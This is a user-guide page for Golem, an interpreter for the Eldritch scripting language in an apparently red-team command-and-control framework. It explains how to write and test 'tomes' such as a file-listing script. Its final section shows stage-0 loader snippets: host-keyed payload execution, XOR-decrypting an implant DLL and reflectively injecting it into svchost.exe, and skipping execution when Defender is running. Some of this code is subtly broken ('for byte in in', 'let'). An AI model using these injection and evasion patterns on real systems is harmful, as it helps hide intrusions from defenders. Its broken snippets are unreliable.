---
title: Golem
tags:
 - User Guide
description: Golem User Guide
permalink: user-guide/golem
---
## What is Golem

Golem is the standalone interpreter for Eldritch.
This program exists to help users get experience with the Eldritch language as well as a jumping off point if you're interested in implementing your own program using the Eldritch language. Additionally, consult our [Tomes](/user-guide/tomes) documentation for information about packaging [Eldritch](/user-guide/terminology#eldritch) code for use with [Imix](/user-guide/imix) and Tavern.

Golem can also be used operationally as an alternative to a system native shell.
You can leverage the power of Eldritch with minimal exposure in the system process tree.

## Try it out

```bash
git clone git@github.com:spellshift/realm.git
cd realm/implants/golem

# Launch and interactive REPL
cargo run -- -i

# Or run a tome on disk
cargo build --release && \
    ../target/release/golem ../../bin/golem_cli_test/hello_world.eldritch
```

## Creating and testing tomes

Golem is a great way to quickly develop and iterate tomes without needing to deploy an agent and wait for callbacks. It enables a more interactive experience for Eldritch, which helps tome developers move quickly.
Golem operates in three different modes:

- Interactive `-i`
- With embedded tomes _no args_
- On a specific tome `/path/to/tome/main.eldritch`

In this guide we'll leverage the last one.

### Tome structure

Copy an existing tome and rename it to your desired name.

```bash
[~/realm]$ cd tavern/tomes/
[./tomes]$ cp -r ./file_list ./new_tome
```

This will setup the boiler plate.
A tome file structure should look like this:

```
./new_tome/
├── files
│   └── test-file
├── main.eldritch
└── metadata.yml
```

_If you have no files associated with your tome you can ommit the `files` dir_

- main.eldritch - Defines our actual Eldritch functionality and what will be executed on the agent.
- metadata.yaml - Defines information that tavern will use to prepare your tome including prompting users for input.

### Tome Metadata

Your tome Metadata should look like this:

```yaml
name: List files # The name of your tome.
description: List the files and directories found at the path # A description to help users understand what your tome does.
author: hulto # Your Github username.
support_model: FIRST_PARTY # Is this a tome that ships with Realm or not?
tactic: RECON # Which MTIRE ATT&CK Tactic best describes this tome?
paramdefs: # A list of inputs the tome requires.
- name: path # The name of the input parameter `input_params['path']`.
  type: string # The type of the input parameter.
  label: File path # A Label that will be displayed in the UI to help users understand the purpose.
  placeholder: "/etc/" # A placeholder to give users an idea of how their input should be formatted.
```

### Building your Eldritch script

Eldritch while it looks like python is distinct and many features in python do not exist in Eldritch.

For an almost complete list of syntax checkout the starlark (DSL which Eldritch is based on) docs <https://bazel.build/rules/language>
*Note: The docs may be incorrect in some places as we're using the starlark-rust implementation which doesn't always adhere to the starlark spec.*

```python
# Define our function for the tome and any inputs
def file_list(path):
    # make sure you proactively check the state of the system.
    # Users may pass bad data in or the system may be in an
    # unexpected state so always check if something is a dir
    # before treatingi it like one.
    if file.is_dir(path):
        files = file.list(path)
        for f in files:
            type_str = ""
            if f['type'] == "Directory":
                type_str = "Dir"
            if f['type'] == "Link":
                type_str = "Link"
            if f['type'] == "File":
                type_str = "File"
            # Formatting - By default Eldritch will print data as a JSON Dictionary which is easy for scripts to read but
            # not great for humans to make your tome more usable make sure you print data in a readable way.
            print(f['permissions']+"\t"+f['owner']+"\t"+f['group']+"\t"+str(f['size'])+"\t"+f['modified']+"\t"+type_str+"\t"+f['file_name']+"\n")
    else:
        print("Error: Invalid Path ("+path+")\n")

# Call our tomes function.
file_list(input_params['path'])
# `input_params` is a dictionary that's implicitly passed into the Eldritch runtime.
# The key value pairs in input_params is defined by the users answers to the paramdefs in the UI.
# For example if you specify `name: path` in your `metadata.yml` file the UI will ask the user for
# a path and then populate the `path` key in `input_params` when the tome runs.
# Input params is unique to each task so setting a var in one task won't affect others.
print("\n")
print("\n")
```

### Design ideology

Tomes are designed to accomplish specific workflows.
Some small tomes have been created to accomplish basic sysadmin tasks like reading, writing files, checking processes etc.
Ideally though if you have a specific workflow you'll define it as a tome.
We want to avoid queueing multiple quests to accomplish a workflow.

### Testing your tome

Now that your tome is created let's test it locally.

```bash
[~]$ cd realm/implants/golem
[./golem]$ cargo run -- ~/realm/tavern/tomes/new_tome/main.eldritch
# ...
# Tome output
# ...
```

_If you have input_params that you need to define for your tome manually set them for your test by adding a line like this:_

```python
input_params['path'] = "/tmp/"
file_list(input_params['path'])
```

## Golem embedded files

The Eldritch interpreter can embed files at compile time. To interact with these assets use the `assets` module in Eldritch. In addition to programmatic access the embedded files can be automatically executed at run time. If no other option is specified `-i` or a file path, golem will iterate over every instance of `main.eldritch` in the embedded assets launching each one as a separate thread. This behavior is desirable when trying to perform recon or deploy persistence quickly.

## Golem as a stage 0

Golem can also be used as a stage 0 to load imix or other c2 agents.
This can help in a few ways such as:

- Keying payloads to specific hosts

```python
def main():
    if is_linux():
        if is_dir("/home/hulto/"):
            run_payload()
main()
```

- Executing encrypted payloads from memory

```python
def decrypt(payload_bytes):
    let res = []
    for byte in in payload_bytes:
        res.push(byte ^ 6)
    return res

def main():
    if is_windows():
        for proc in process.list():
            if "svchost.exe" in proc['name']:
                let enc_bytes = assets.read_bytes("imix.dll")
                sys.dll_reflect(decrypt(enc_bytes), proc['pid'], 'imix_main')
                return

main()
```

- Detecting security products before execution

```python
def main():
    for proc in process.list():
        if "MsMpEng.exe" in proc['name']:
            return
    run_payload()
main()
```
